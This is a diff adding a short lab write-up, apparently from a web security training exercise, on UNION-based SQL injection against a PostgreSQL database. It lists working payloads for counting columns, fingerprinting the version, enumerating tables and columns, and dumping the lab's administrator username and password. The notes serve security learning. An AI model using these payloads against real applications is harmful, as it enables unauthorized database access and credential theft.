@@ -1,0 +1,41 @@
+Lab #9 SQL injection attack, listing the database contents on non Oracle databases
+
+End Goals:
+1. Determine the table that contains usernames and
+    passwords
+2. Determine the relevant columns
+3. Output the content of the table
+4. Login as the administrator user
+------------------------------------------------------------------------------------
+
+Steps:
+
+1. Find the number of columns. 
+    use order by clause.
+
+' order by 3--      => Internal server error
+
+2. Find the data type of the columns
+' UNION select 'a', 'a'--
+-> both columns accept type text
+
+3. Find the version of the database. 
+
+'UNION select @@version, NULL--     => not Microsoft
+'UNION select version(), NULL--    
+    PostgreSQL 11.11
+
+4. Output the list of table names in the database
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+    users_xgmqsq
+
+5. Output the column name in the database.
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xgmqsq'--
+    username_zuyigq
+    password_wtfxwj
+
+6. Output usernames and passwords.
+
+' UNION select username_zuyigq, password_wtfxwj from users_xgmqsq--
+    administrator
+    jsgv2y4naxhn2egcxjdn
